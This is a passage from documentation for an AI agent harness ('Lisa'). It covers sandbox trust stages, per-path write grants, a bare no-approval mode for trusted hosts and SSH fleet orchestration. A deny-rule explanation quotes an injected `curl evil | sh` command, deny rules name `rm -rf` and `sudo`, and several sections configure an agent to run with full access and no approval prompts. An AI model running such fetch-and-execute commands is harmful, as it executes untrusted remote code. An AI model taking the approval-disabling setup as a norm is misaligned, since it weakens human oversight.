1. Have Lisa restructure a config file in `/etc` and produce the layer;
   export it, read the diff, and reject it (delete the layer rather than
   apply). Observe that nothing on the live system moved.
2. Have Lisa stage a change, then apply it, then verify with the service's
   own `--check` or `systemd-analyze verify`.

**Where to go next.** When you want certain paths to take *real* writes
without a review step — a directory of live data, a shared volume — move to
Stage 3.

---

## Stage 3 — Real writes to real paths

> *Trust level: the sandbox still contains everything except a small set of
> explicitly named paths, which take real, immediate writes.*

### 3.1 Goals

- Named paths (`/srv/shared`, `/data`, `/mnt/anything`) are written for
  real, by explicit per-path grant.
- Everything not granted stays contained exactly as in Stage 2.
- The writable surface is auditable in one place: the floor's `paths` map.

### 3.2 The configuration

Per §3.2 (the axis-table section), `paths` is where the floor genuinely
grants — this is where the "real writes" requirement actually lands:

```yaml
            paths:
              /var/log: ro
              /run/log/journal: ro
              /srv/shared: rw
```

Inside the sandbox, `/srv/shared` is a `--bind` (read-write) of the real
path. Writes land immediately. What that means in practice:

- The model can `sed -i`, `cat > file`, `install`, or use any editor against
  files under `/srv/shared` with no staging and no apply step.
- The write is real the moment the command returns.
- The audit trail (`<data_dir>/run/<session_key>/bash-<key>.log` and the
  bwrap log) records the command.
- The sandbox cannot roll this back — there is no layer to roll back *from*.

**The nesting rule, important and easy to get wrong:**

> A nested bind inherits the **nearest** floor path. Real writes require an
> **explicit trusted `rw` grant for that subtree.**

So a floor of `paths: {/srv: ro}` refuses a request for `rw` on
`/srv/shared` with a `PolicyError` naming the nearest floor path.
Conversely, granting `/srv/shared: rw` does *not* imply
`/srv/shared/subdir: rw` — a request for that needs its own grant. Write the
floor to match the granularity you actually intend.

**One more subtlety about `persistence: readonly`:** the floor's `paths`
binds are emitted *after* the backend binds, and independently of the
persistence posture. A floor of `persistence: readonly` **plus**
`paths: {/srv/shared: rw}` still emits `--bind /srv/shared /srv/shared` — a
real writable path under a "readonly" posture. Verified:

```text
floor {persistence: readonly, paths: {/srv/shared: rw}}
  -> argv: ... --bind /srv/shared /srv/shared ...
```

Use `persistence: readonly` only when you also want the *workspace* and
scratch locked down; it does not neutralize an `rw` path grant.

**Safety mechanisms you retain at this stage:**

1. **Per-path granularity.** Mix `rw` and `ro` grants freely:
   `paths: {/srv/shared/node-1: rw, /srv/shared/node-2: ro}`. Paths you want
   protected get a read-only failure — a *clean, obvious* error the model
   can report, rather than a silent partial write.
2. **Filesystem- or mount-level read-only** as a backstop under the floor —
   belt and braces so that even a floor mistake cannot write.
3. **Version control on the written tree.** If an `rw` path is under git,
   every write is diffable and revertible, independent of Lisa.
4. **The instruction body.** Tell the model explicitly that `rw` paths are
   production and that writes there are immediate.

### 3.3 Instruction body — name the writable surface

```markdown
## Writable paths

`/srv/shared` is bound read-write. Writes there are real and immediate.
Treat them as production writes: inspect before you mutate, and prefer a
reversible edit.
```

### 3.4 Verify

```bash
lisa prompt "/shell echo probe > /srv/shared/probe.txt"
cat /srv/shared/probe.txt   # real write, before you apply anything
```

- Expect `sandboxed: true` and no `layer_id` for that call — a real path
  grant is not a capture.
- A request for `rw` on an un-granted path is refused, per §3.2.

**Exercise.** Have Lisa write a file under the `rw` path (watch it land) and
then try to write under a sibling path with no grant (watch the refusal).

**Where to go next.** When the *whole machine* should be in Lisa's hands —
service restarts, package ops, writes to `/var/lib` — that is no longer a
sandbox question at all. Move to Stage 4.

---

## Stage 4 — Trusted host: running bare on purpose

> *Trust level: no sandbox. Lisa runs raw bash with full access on this
> machine. Appropriate for a machine the operator has fully handed over —
> and the model is instructed accordingly.*

### 4.1 Goals

- Lisa runs **raw bash with full access**.
- **No approval prompts** — the operator has already decided this host is
  fully in Lisa's hands.
- The model still gets a *single* tool surface (`bash_run`), the session
  still carries `cwd`/`env`/functions, and every command is still written to
  a per-session audit log.

### 4.2 What "no prompts" actually requires

There is **no session-manifest key** that disables approvals. Approval
posture is *host-owned* and lives in `policy.yaml`, not in the session plan.
The session plan's `execution` block is tighten-only and cannot grant
broader execution.

So a trusted host needs two things, in two different places:

1. **A session plan** that selects the bwrap pack and pins
   `execution: bare` in its floor.
2. **A host policy** in `mode: trust` with `bare_requires_approval: false`.

### 4.3 The bwrap pack is mandatory even for bare mode

This is the correction that matters most at this stage, and it inverts the
obvious design. **You cannot get bare execution by omitting the sandbox
pack.**

`bash_run` reads its posture from the *bwrap owner's* floor:

```python
def _floor_requires_sandbox(ctx) -> bool:
    floor = ctx.execution_floor_for("bwrap_run")
    return floor is None or floor.execution != "bare"
```

A missing floor returns `True` — "not evidence of consent to run bare" — and
the shell hard-fails with `SandboxRequiredButUnavailable`. Verified
end-to-end against the real `bash_run.execute`:

```text
CASE 1  no bwrap pack, no floor:
        error: The sandbox floor for this session requires contained execution
               (execution=sandbox), but the sandbox cannot run: ...
        sandboxed: False   mode: None            <-- the shell is BROKEN

CASE 2  bwrap pack present, floor execution=bare:
        error: (none)
        sandboxed: False   mode: bare             <-- what you want
```

So the session plan must:

1. **Include `lisa-pack-bwrap`** in `required` and `include`.
2. **Set `providers.capabilities.sandbox: lisa-pack-bwrap`** — this is what
   makes the bwrap pack the floor owner, so its floor is the one `bash_run`
   reads.
3. **Pin `execution: bare`** in that pack's floor.

The pack's own README says the opposite — that removing the bwrap pack is
how you get unsandboxed execution. Per the code above, that produces a
*broken shell*, not a bare one.

A useful side effect of selecting the pack: the model can still opt into
containment **per call** by passing `overrides`/`persist`/`layer_id`, so you
can say "run that one exploratory diagnostic in a sandbox" without any host
change. Under a bare floor, `bash_run` runs bare *unless* the model asks for
a sandbox axis.

### 4.4 The session plan and policy

The session plan (`~/.lisa/config/session_context.md`):

```markdown
---
schema_version: 2
name: trusted-host

surface:
  type: personal_dm
  id: local-console
  memory_scope: personal

resources:
  packs:
    required:
      - lisa-pack-bash
      - lisa-pack-bwrap
    include:
      - lisa-pack-bash
      - lisa-pack-bwrap
    configuration:
      lisa-pack-bwrap:
        sandbox:
          floor:
            execution: bare
            persistence: direct-write
            network: allow
            device: minimal
            ipc: shared
      lisa-pack-bash:
        session_state:
          cwd: true
          env: true
          functions: allowlist
          patterns:
            - "svc_*"
            - "host_*"

providers:
  capabilities:
    sandbox: lisa-pack-bwrap

routing:
  start_mode: default

execution:
  max_model_calls: 40
  max_capability_calls: 80
  max_wall_ms: 900000

---

# Trusted host

You run **bare** on this machine: your commands execute directly, with full
access and no approval prompts. The operator has explicitly entrusted this
host to you.

## Posture

Every `bash_run` result will carry `sandboxed: false` and `mode: "bare"`.
That is expected and correct — it means the harness chose bare execution by
policy, not that something is broken.

Because your writes are real and permanent:

- Inspect before you mutate. `cat`, `ls`, `stat`, `systemctl status`,
  `journalctl` first.
- Never run `rm -rf`, mass `chmod`/`chown`, package installs, or service
  restarts unless the operator asked for that exact change.
- Prefer reversible changes: write a new config, validate it
  (`systemd-analyze verify`, the service's own `--check` flag), then
  `mv` it into place, so there is a one-step rollback.

You are expected to act, not to ask for permission. When a command fails,
diagnose it and try the next reasonable thing rather than stopping at the
first error. Report the actual output, including failures.

## Optional containment

If you want to run one exploratory command without touching the live system,
you may ask for the sandbox on that call:

    overrides: {"persistence": "ephemeral", "network": "deny"}

Your writes then go to a scratch area and are discarded when the run ends.
Use this for probing; use bare execution for anything that must actually
change the host.
```

The approval policy — either hand-edit `~/.lisa/config/policy.yaml`:

```yaml
version: 1
mode: trust
sandbox_downgrade: true
bare_requires_approval: false
allow: []
ask: []
deny: []
```

… or, equivalently:

```bash
lisa policy mode trust      # auto-allow write + execute
lisa policy bare off        # do not prompt for unsandboxed execute
```

These two commands are the **entire** approval setup. "Raw bash with full
access and no approvals" is exactly what they produce: every `bash_run` call
on this host is an unsandboxed `execute`, trust mode's fallback wants to
allow it, and `bare_requires_approval: false` removes the one guard that
would otherwise intercept exactly that case.

**The honest account of what can still prompt** — three sources, all of them
deliberate safety valves rather than gaps in the config:

| # | Residual prompt source | Why it survives | Can you eliminate it? |
|---|---|---|---|
| 1 | An `external_write` action (cloud API, ticket system, anything outside the host) | Trust mode never auto-allows `external_write` — the sandbox boundary cannot contain it by definition | Yes, deliberately: add an `allow` rule scoped to that tool (`lisa policy rule add allow --tool <id>`). Do it per external tool, never blanket |
| 2 | **More than 10 policy-approved actions in one turn** | `AUTO_APPROVE_TURN_CAP = 10` is hard-coded in the runtime (`runtime/policy.py`) and is *not* a `policy.yaml` key — it applies to *every* policy-approved action on every host | No — and you should not want to. It exists so a runaway loop surfaces as a prompt instead of burning through your system. A turn that needs >10 unattended writes is a turn worth watching |
| 3 | A `deny` rule you added yourself | That is the point of adding one | Don't add one, or narrow it |

**Consider whether to keep a narrow `deny` list.** A common, defensible
choice is to deny only the genuinely catastrophic:

```yaml
deny:
  - when: '("rm" in action.argv) && ("-rf" in action.argv || "-fr" in action.argv)'
```

That blocks the specific catastrophic pattern while leaving the "full
access, no approvals" instruction intact. Whether you want this is a
judgment call — but make it *deliberately* rather than by accident. Note
that a `deny` match is **not** an approval prompt: the action fails loudly
as a tool error and the model reroutes, so it never interrupts you.

**What you cannot do (and should not want to):** there is no
session-manifest key, CLI flag, or `policy.yaml` entry named "trust
everything" / "no approvals" / "yolo". The `execution` block in a session
plan is tighten-only and cannot grant broader execution. The two `lisa
policy` commands above are the complete and only mechanism — which is a
feature: the posture you chose is visible in one file and auditable by
`lisa policy`.

### 4.5 What the model is told

The `bash_run` tool description and the shell mode doc both teach the
posture, and your session body's instruction is what actually shapes
behavior. Two things matter in the instruction body:

1. **State the posture plainly.** The model sees `sandboxed: false` and
   `mode: "bare"` on every result, and the pack's default guidance is "state
   what a mutating command will do before running it." If you want
   *unattended* execution — which "no approvals" implies — your instruction
   body needs to say so, because the pack's default guidance errs toward
   announcing.
2. **Tell it to act, not to ask.** The model cannot prompt a human for
   approval (that mechanism is the host's, and it is disabled). Tell it to
   execute literally, diagnose failures, and report actual output.

The combination of `mode: trust` + `bare_requires_approval: false` + a body
that says "act, don't ask" is what produces the intended behavior.

### 4.6 Verify

```bash
lisa policy                                    # mode: trust; bare_requires_approval: false
cat ~/.lisa/run/*/sandbox-facts.json 2>/dev/null
```

Expect `"containment": "deliberate_bare"` — "the harness chose bare
execution by policy", as opposed to `degraded` (the sandbox is registered
but cannot run) or `none` (no sandbox pack is registered at all). The
approval engine's `_CONTAINED_STATES` is exactly `{"contained"}` — so
`deliberate_bare` counts as **not contained**, which is why
`bare_requires_approval` must be `false` for unattended runs.

```bash
lisa prompt "/shell systemctl is-active sshd && uptime"   # runs unattended
```

---

## Stage 5 — The distributed fleet

> *Trust level: multi-machine. A tightly contained Lisa on the control box
> orchestrates, while a fully trusted Lisa on each managed node executes.
> SSH is the bridge — deliberately narrow, and the trust transfers with the
> key's scope, not with the model.*

### 5.1 Why two trust levels at once

The fleet architecture exists because the two kinds of host pull in opposite
directions:

| # | Requirement | Pulls toward |
| --- | --- | --- |
| R1 | The control-box Lisa must *debug and troubleshoot the control system* from inside the sandbox | A **wide-open sandbox** — the model needs to see processes, logs, sockets, service state, `/proc`, `/sys`, real filesystem layout |
| R2 | The control-box Lisa must **reach managed nodes** and run commands there | **Network access** from inside the sandbox, plus SSH tooling and key material |
| R3 | The Lisa running *on the managed nodes* must run **raw bash with full access, no approvals** | The **bare** execution posture and a **trust** approval policy |

The critical insight — the one that makes the whole design work — is that
**R3 is a statement about a *different Lisa instance*, running on a
different host.** The control-box Lisa is the one that needs containment.
The managed-node Lisa is the one that needs trust. Conflating them is the
mistake that leads either to an unsandboxed control box, or to a managed
node that cannot do its job.

```text
                    ┌──────────────────────────────────────┐
                    │        CONTROL BOX (you sit here)    │
                    │                                      │
                    │  ┌────────────────────────────────┐  │
                    │  │  Lisa (contained — Stage 2/3)  │  │
                    │  │  bwrap sandbox, wide-open      │  │
                    │  │  network allowed, /dev real,   │  │
                    │  │  proc/sys visible, caps dropped│  │
                    │  │                                │  │
                    │  │  ssh → managed-node-1          │  │
                    │  │  ssh → managed-node-2          │  │
                    │  │  ssh → managed-node-N          │  │
                    │  └────────────────────────────────┘  │
                    │                                      │
                    │  mounted managed filesystems         │
                    │  /mnt/managed/node-1  (rw)           │
                    │  /mnt/managed/node-2  (rw)           │
                    │  /mnt/managed/node-N  (rw)           │
                    └───────────────┬──────────────────────┘
                                    │ ssh (trusted, no prompts)
              ┌─────────────────────┼─────────────────────┐
              │                     │                     │
      ┌───────▼────────┐  ┌────────▼───────┐  ┌──────────▼──────┐
      │ managed-node-1 │  │ managed-node-2 │  │ managed-node-N  │
      │                │  │                │  │                 │
      │ Lisa           │  │ Lisa           │  │ Lisa            │
      │ Stage 4 bare   │  │ Stage 4 bare   │  │ Stage 4 bare    │
      │ full access    │  │ full access    │  │ full access     │
      │ no approvals   │  │ no approvals    │  │ no approvals     │
      └────────────────┘  └────────────────┘  └─────────────────┘
```

The control-box Lisa (contained) is the reasoning layer: it reads logs,
correlates symptoms, decides what to change, and then executes changes —
either locally in a reviewed capture layer, or on a managed node over SSH,
or by writing through a mounted filesystem.

The managed-node Lisas (bare + trust, i.e. a straight application of
[Stage 4](#stage-4--trusted-host-running-bare-on-purpose)) are the *hands*.
They execute on the node with full access and no prompt fatigue, because you
have already decided that those nodes are fully in Lisa's hands.

### 5.2 The control-box configuration — Stage 2/3 plus reach

Only three things change relative to Stage 2/3: the floor permits network,
the floor grants the mounted fleet tree `rw`, and the policy gets its one
deliberate `deny` rule and is genuinely "one-and-done".

The floor axes for the control box, and the reasoning for each:

| Axis | Value | Reasoning |
| --- | --- | --- |
| `execution` | `sandbox` | The control box is production. Containment is non-negotiable here. **Also what makes the shell work at all** (§3.7). |
| `persistence` | `overlay` | A **ceiling**: `direct-write` becomes a `PolicyError`, so the model can never request real writes into the sandbox. Does *not* by itself turn capture on (§3.1, §3.3). |
| `network` | `allow` | **Permits** network; the model must request it per call. A `deny` floor emits `--unshare-net` and refuses an `allow` request outright. Mandatory for SSH (see [§9.1](#91-what-network-deny-does)). |
| `device` | `minimal` | **A real `/dev` with a working PTY.** Verified: `pty.openpty()` fails with `OSError: out of pty devices` under `device: none` — that breaks OpenSSH's PTY-request path. `minimal` gives the same capability as `dev`, is the tighter of the two, and the model cannot change it either way (§3.5). |
| `ipc` | `unshared` | Isolated SysV/POSIX IPC. Almost never needed by a shell session; the model cannot request `shared`. |
| `tmpfs_budget_bytes` | `268435456` (256 MiB) | The default floor caps `/tmp` at 64 MiB. A 256 MiB cap leaves room for `tar`/`rsync`/build staging while still bounding a runaway writer. **This one does take effect** — it is a budget axis, joined by `min()`. |
| `timeout_ceiling_seconds` | *(omitted)* | Deliberately omitted. It is parsed and joined, but **not enforced** on the child (§3.6), and `bash_run`'s own `timeout_seconds` (1–300, with auto-backgrounding) is the real control. |
| `paths` | logs `ro`, `/mnt/managed` `rw` | The one genuine *grant* (§3.2), and the fleet write surface. |

The full session plan:

```markdown
---
schema_version: 2
name: control-box-contained

surface:
  type: personal_dm
  id: control-box-console
  memory_scope: personal

resources:
  packs:
    required:
      - lisa-pack-bash
      - lisa-pack-bwrap
    include:
      - lisa-pack-bash
      - lisa-pack-bwrap
    configuration:
      lisa-pack-bwrap:
        sandbox:
          floor:
            execution: sandbox
            persistence: overlay
            network: allow
            device: minimal
            ipc: unshared
            tmpfs_budget_bytes: 268435456
            paths:
              /var/log: ro
              /run/log/journal: ro
              /mnt/managed: rw
      lisa-pack-bash:
        session_state:
          cwd: true
          env: true
          functions: allowlist
          patterns:
            - "fleet_*"
            - "node_*"

providers:
  capabilities:
    sandbox: lisa-pack-bwrap

routing:
  start_mode: default

execution:
  max_model_calls: 30
  max_capability_calls: 60
  max_wall_ms: 600000

---

# Control-box Lisa — contained

You are the primary operator's assistant for this distributed control plane.

## Posture

Your shell runs inside a bubblewrap sandbox. Read the posture stamp on every
`bash_run` result and obey it:

- `backend: "overlay"` — your writes are STAGED in a capture layer, not
  applied. Report the `layer_id` and `captured_paths`. Never claim a staged
  change is merged, applied, or done. The user reviews and applies.
- `backend: "tmpfs"` with `persistence: "ephemeral"` — your writes vanish.
  Stage a patch or script under `scratch_dir` and hand it back.
- `sandboxed: false` with `mode: "bare"` — you are on the real host. Every
  change is permanent. Say so before mutating anything.

Inside the sandbox you have a read-only view of the whole root filesystem.
You can and should run `journalctl`, `systemctl status`, `ss -tulpn`,
`ip a`, `cat /proc/*`, `dmesg`, and read every log file directly.

## How to ask for what you need

Your sandbox starts in the tightest default posture: no network, ephemeral
writes, minimal `/dev`. The harness floor permits more, but **permission is
not the same as grant** — you must ask for it on the call, via the
`overrides` parameter of `bash_run`:

- Need to reach a managed node? Ask for network:
  `overrides: {"network": "allow"}`.
- Want to stage a config change for review instead of writing it live? Ask
  for the overlay posture and name the paths:
  `overrides: {"persistence": "overlay", "paths": {"/etc": "capture"}}`.
  The result then carries `backend: "overlay"` and a `layer_id`.
- Want both? Combine them in one `overrides` object.

`overrides` may only *raise* integrity above the floor. If a request is
refused, relay the error and suggest the operator change the policy — do not
reword and retry it.

## Ownership inside the sandbox

You run as mapped root via a single-entry uid map. Files owned by other host
uids display as `nobody:nobody` (overflow uid 65534). That is a display
artifact, not an error. Use `ls -n` / `stat -c %u:%g` when ownership
matters. **Never `chown`/`chmod` to "repair" owners inside the sandbox.**

## Remote nodes

Managed nodes are reached with `ssh <host>`. A managed node may have its own
Lisa instance, which runs bare and trusted. Do not wrap remote commands in
approval requests on their behalf; that node's policy is its own.

## Mounted managed filesystems

`/mnt/managed` is bound read-write. Writes there are real and immediate —
they land on the managed nodes' filesystems. Treat them as production
writes: inspect before you mutate, and prefer a reversible edit.
```

The `session_state` block for the bash pack deserves a word, separate from
the sandbox floor and keyed under the *bash* pack:

- `cwd` and `env` always carry across calls by default — `cd` once, later
  commands see it; `export` once, later commands see it.
- **Function-body replay is off by default** and opt-in per pattern. It is
  captured as base64 and replayed into the session state file. For a fleet
  operator, allowing `fleet_*` and `node_*` helper functions is a genuine
  quality-of-life win: the model defines `fleet_status()` once and reuses it
  across the whole conversation, rather than re-deriving the SSH fan-out
  every turn. Set `functions: blocklist` to allow everything *except*
  specific patterns, or `off` to disable entirely.

### 5.3 The control-box approval policy — one-and-done

The goal is **one-and-done**: author once, never see an approval panel
during normal operation.

```yaml
version: 1
mode: trust
sandbox_downgrade: true
bare_requires_approval: true
allow: []
ask: []
deny:
  - when: '("rm" in action.argv) || ("sudo" in action.argv)'
```

```bash
lisa policy mode trust      # the only dial you need to turn
# leave bare ON (it is the default): lisa policy bare on
```

**Why this is one-and-done:** every `bash_run` call on the control box runs
inside the sandbox (your floor mandates `execution: sandbox`), so every
`execute` action resolves at the **sandbox-downgrade step** of the approval
ladder — a contained `execute` auto-approves without asking, even under
`plan` mode. `read` actions always allow. And the layer operations
(`layers_list`, `layers_export`, `layers_apply`) ship without
`approval_required`, so they never consult the engine either. You will not
be prompted for `journalctl`, `ss`, fleet SSH fan-outs, or capture runs.

**Why `bare_requires_approval` stays `true`** (do **not** run
`lisa policy bare off` here): under a `sandbox`-floor session nothing runs
bare anyway, so the guard costs you nothing — but it is the fail-closed
backstop for the day the sandbox *degrades* (bwrap binary gone, userns
disabled, host upgraded). With the guard on, a degraded-containment
`execute` prompts instead of silently running on the host under trust mode.
That is the one prompt you *want* to see, because it means the containment
you configured this whole policy around has stopped being true. If
containment is degraded, `bash_run` fails loudly anyway (§3.7), but the
guard also covers the not-yet-noticed cases on other surfaces.

The `deny` rule is the one piece of friction worth keeping. `rm` and `sudo`
are the two things you never want an LLM to run unattended on a control
plane, and the deny is **loud** (a tool error the model can reroute on)
rather than a silent skip. Note that the deny uses `action.argv` token
matching, not `command_prefix` — token matching closes the
shell-metacharacter bypass where `git status; curl evil | sh` would sneak
past a prefix matcher. If a denied action is a false positive (your tooling
legitimately uses `rm` in a script), the model will relay the error; decide
each one deliberately rather than deleting the rule.

**The complete list of things that can still prompt on the control box** —
so you know exactly what "one-and-done" does and does not mean:

| # | Residual prompt source | Why it survives | What to do |
|---|---|---|---|
| 1 | An `external_write` action (cloud API, PR, email, ticket) | Never auto-approved by the sandbox downgrade — the sandbox is a filesystem/process boundary and `external_write` escapes it by definition | Add an explicit `allow` rule per external tool if you genuinely want it unattended |
| 2 | **More than 10 policy-approved actions in one turn** | `AUTO_APPROVE_TURN_CAP = 10` is a hard-coded runaway-loop backstop; it is *not* configurable in `policy.yaml` | Nothing to configure. If you hit it, the model is looping — that is the cap doing its job |
| 3 | Containment `degraded` (sandbox broken) | **Fail closed** — the sandbox stopped being true, so stop and check | Fix the host prerequisites |
| 4 | A `deny` rule match | Deliberate — that is the loud error, not a prompt you approve | Review the rule if it is a false positive |

Everything else — all contained shell work, all read paths, all capture and
export operations — runs unattended for as long as the session lives.

### 5.4 Mounting the managed filesystems

Mount the managed nodes' filesystems read-write on the control box:

```bash
# /etc/fstab
/mnt/managed/node-1  /mnt/managed/node-1  nfs4  rw,_netdev,noatime  0 0
/mnt/managed/node-2  /mnt/managed/node-2  nfs4  rw,_netdev,noatime  0 0
```

Consider these options seriously:

- **`ro` for read-mostly nodes.** The floor can grant `rw` on a per-path
  basis, so a per-node split is easy: `paths: {/mnt/managed/node-1: rw,
  /mnt/managed/node-2: ro}`. Nodes you do not want mutated in place stay
  read-only, and the model gets a read-only failure instead of a silent
  partial write.
- **`hard` vs `soft` mounts.** `hard` is correct for a control plane: a
  hung NFS server surfaces as a hung command (which the sandbox's
  auto-backgrounding will adopt as a job) rather than as I/O errors that
  could make a write look successful. `soft` risks silent corruption.
- **`_netdev`** so the mount ordering is sane at boot.
- **`noatime`** reduces write traffic to the remote filesystem — and fewer
  writes to the managed nodes is fewer things to review.

**A caveat worth understanding:** a `rw` bind of an NFS mount means the
sandbox's write isolation does not extend to the remote filesystem. The
sandbox protects the *control box's* filesystem; it cannot protect a remote
filesystem it is handed a writable handle to. The control you retain is
mount-level (read-only vs read-write, per node) and the audit trail, not
sandbox containment.

### 5.5 Writing to mounted managed filesystems — `rw` vs `capture`

You have two mechanisms for Lisa to write to the mounted fleet, and they
differ in an important way.

**Direct write through the `rw` bind (recommended).** The floor's `paths`
map grants `rw` on `/mnt/managed`; writes land immediately on the remote
filesystem. Safety mechanisms you retain:

1. **Per-node granularity.** `paths: {/mnt/managed/node-1: rw,
   /mnt/managed/node-2: ro}` — nodes you want protected get a read-only
   failure.
2. **Mount-level read-only.** Mark the node read-only in `/etc/fstab` and
   *also* keep it `ro` in the floor.
3. **Version control on the managed side.** If the managed filesystems are
   under git (a strong recommendation), every write is diffable and
   revertible, independent of Lisa.
4. **The instruction body.** Tell the model explicitly that `/mnt/managed`
   is production and that writes there are immediate.

**The `capture` alternative (when you want review).** The model asks per
call — **not** by pinning `capture` in the floor (§3.3):

```text
overrides: {"persistence": "overlay", "paths": {"/mnt/managed": "capture"}}
```

Then writes are captured in the overlay layer, exported as diffs, and
applied by you. This is the right call for a fleet where a bad write to one
node's config can cascade.

**The cost — and this is the hard part:** the capture target must be a real
absolute directory that overlayfs can use as a `lowerdir`. NFS and other
network filesystems are **not** supported as overlayfs lower layers —
overlayfs requires a local filesystem with `userxattr` support. So `capture`
on an NFS-mounted `/mnt/managed` will fail. **This is a hard constraint of
the mechanism, not a configuration mistake.** Verify before relying on it:

```bash
stat -f -c '%T' /mnt/managed/node-1
# 'nfs4' or 'nfs'         => capture will NOT work here
# 'ext4', 'xfs', 'btrfs'  => capture is viable
```

If it is NFS, use the `rw` bind and get your reviewability from git on the
managed side instead of from the capture layer.

A useful variant: mount the managed filesystems **twice** — read-write at
`/mnt/managed` for the real work, and read-only at `/mnt/managed-ro` for
inspection. Then you can grant `/mnt/managed-ro: ro` in the floor and the
model can always look without any risk of an accidental write.

**Deciding between the two:**

| | `rw` bind | `capture` |
| --- | --- | --- |
| Write latency | Immediate | Deferred until apply |
| Reviewability | Git on the managed side | Layer export diffs |
| Works on NFS | **Yes** | **No** (overlayfs limitation) |
| Model friction | None | Must request it per call, report `layer_id`; user must apply |
| Blast radius of a bad write | Live | Contained until applied |
| Best for | Nodes you want fixed *now* | High-value config trees you want diffed first |

A good hybrid: `rw` on `/mnt/managed` (so the fleet can be fixed in place)
and per-call `capture` requests for `/etc` and `/opt/control` (so changes to
the control system's own configuration are always reviewed).

### 5.6 Side by side: control box vs managed node

| Dimension | **Control box (contained)** | **Managed node (trusted)** |
| --- | --- | --- |
| Host role | Orchestration, diagnosis, correlation | Execution, hands-on remediation |
| Trust stage | Stage 2/3 — the security boundary | Stage 4 — the hands |
| `execution` | `sandbox` | `bare` |
| `persistence` | `overlay` (as a **ceiling**) | `direct-write` |
| `network` | `allow` (permits; model must request) | `allow` |
| `device` | `minimal` (real `/dev` + working PTY) | `minimal` |
| `ipc` | `unshared` | `shared` |
| `paths` | `ro` for logs, `rw` for `/mnt/managed` | Not meaningful (bare) |
| `capture` paths | **Requested per call**, not floor-pinned (§3.3) | n/a |
| `tmpfs_budget_bytes` | `268435456` | n/a |
| `timeout_ceiling_seconds` | *(omitted — not enforced, §3.6)* | n/a |
| bwrap pack selected | **Required** | **Required** (§4.3) |
| `providers.capabilities.sandbox` | `lisa-pack-bwrap` | `lisa-pack-bwrap` |
| Approval mode | `trust` | `trust` |
| `bare_requires_approval` | `true` | **`false`** |
| `sandbox_downgrade` | `true` | `true` |
| Result stamp | `sandboxed: true`, `backend: "overlay"` or `"tmpfs"` | `sandboxed: false`, `mode: "bare"` |
| Writes to `/etc` | Staged in a layer (if requested); user applies | Real and immediate |
| Writes to `/mnt/managed` | Real (explicit `rw` grant) | Real (on that node) |
| SSH out | Yes, to managed nodes | Usually unnecessary |

> **Both sides require the bwrap pack to be selected.** This is not a quirk
> of the control box — on the managed node it is what *enables* bare mode
> rather than breaking the shell (§3.7, §4.3).

### 5.7 Why the difference is exactly this

It is worth being explicit about the reasoning, because the temptation is to
think "trusted" and "contained" are two points on a dial, and pick one
everywhere.

**Why the control box must be contained.** The control box is where the
orchestration logic lives, where credentials and keys are, and where the
fleet's authoritative state is. It is also the machine a mistake is hardest
to recover from. Containment there is cheap insurance: the `capture`
posture means even a fully-wrong model action produces a *diff to review*
rather than a *corrupted control plane*. The `overlay` + `layers_export` +
`layers_apply` flow exists precisely for this.

**Why the managed nodes must be trusted.** The managed nodes are where work
actually happens. A trusted node's Lisa needs to restart a service, roll a
config, kill a wedged process, and do it *now* without a human confirming
each verb. If the node's Lisa prompts, the control box's Lisa stalls waiting
for a response that will never come — the control box is a batch operator,
not an interactive console. Approval fatigue on a fleet node converts into
operational latency on the control box.

**Why the control box can still reach the managed nodes.** Because SSH is a
*deliberate, narrow, authenticated* channel. The trust transfers with the
SSH key's scope, not with the model. And the SSH connection is *outbound* —
the managed node gains no new privilege because the control box's Lisa
reached it. The trust flows one way, through a credential you control.

**Why `/mnt/managed` is `rw` on the control box.** Because that is an
explicit, per-path, auditable grant of exactly the surface you want
writable. The alternative — making the control box's Lisa write managed
files by SSHing and running a shell command — is *strictly less* controlled:
it bypasses the audit trail's path-level visibility and it reaches the same
files. An explicit `rw` bind is the smaller privilege.

**Why not make the managed nodes contained too?** You could. But then the
"Lisa on the managed node" is not executing on the managed node in any
meaningful sense — it is executing in a sandbox on the managed node, and
the operations that matter on a fleet node (`systemctl`, package management,
service restarts, touching `/var/lib`) are precisely the ones that *cannot*
work inside an unprivileged namespace. A contained managed node's Lisa would
be a shell that cannot do its job.

The practical test: **if the control box were compromised, what could Lisa
reach?** It reaches the control box's filesystem *through the capture layer*
(staged, reviewable), and it reaches the managed nodes *through whatever the
SSH credentials authorize* — which is the real remaining risk surface, and
is why the SSH key's scope matters ([§9.4](#94-scoping-the-ssh-key--the-real-remaining-risk-surface)).

---

## Part III — Cross-cutting subjects

## SSH from inside the sandbox

This is the subject that pushes a containment floor away from the pack
defaults on two axes. Whether you are at Stage 5 (fleet) or any earlier
stage where the sandbox needs outbound SSH, the same mechanics apply.

### 9.1 What `network: deny` does

`network: deny` emits `--unshare-net`. The sandbox gets a **new, empty
network namespace** with only a loopback interface that is down. There is no
route, no DNS resolution, no TCP. Verified:

```text
$ bwrap --unshare-net --ro-bind / / --proc /proc --dev /dev --tmpfs /tmp -- \
    sh -c 'getent hosts github.com || echo DNS-FAIL; (exec 3<>/dev/tcp/1.1.1.1/443 && echo TCP-OK) || echo TCP-FAIL'
DNS-FAIL
TCP-FAIL
```

So for a contained Lisa that must SSH out, `network: allow` is mandatory
**in the floor** (otherwise the model's request is refused outright) — and
the model must also request `overrides: {network: allow}` on the call
(§3.1). There is no middle setting in this axis — it is `allow` or `deny`.

### 9.2 What `device` does to SSH

The device axis has three values, and the argv differs:

- `dev` → `--dev /dev` (a real `/dev` bind)
- `minimal` → `--dev /dev` as well, in the current implementation
- `none` → `--dev-bind /dev/null /dev/null` (no `/dev` at all)

In the current implementation `minimal` and `dev` both emit `--dev /dev`,
which provides a functional `/dev` including `/dev/ptmx` and a mounted
`devpts`. Verified:

```text
$ bwrap --ro-bind / / --proc /proc --dev /dev --tmpfs /tmp -- \
    sh -c 'ls -l /dev/ptmx; python3 -c "import pty; pty.openpty(); print(\"PTY-OK\")"'
lrwxrwxrwx 1 adam adam 8 Oct 22 12:16 /dev/ptmx -> pts/ptmx
PTY-OK
```

The difference shows up in `/proc/mounts`:

```text
# under --dev /dev
devpts /dev/pts devpts ro,nosuid,nodev,noexec,relatime,gid=5,mode=600,ptmxmode=000 0 0
devpts /dev/pts devpts rw,nosuid,noexec,relatime,mode=620,ptmxmode=666 0 0

# under --dev-bind /dev/null /dev/null
devpts /dev/pts devpts ro,nosuid,nodev,noexec,relatime,gid=5,mode=600,ptmxmode=000 0 0
```

— a writable `devpts` with a working `ptmxmode=666` under `--dev /dev`, and
only the read-only one under `--dev-bind /dev/null /dev/null`. And the
functional difference is decisive:

```text
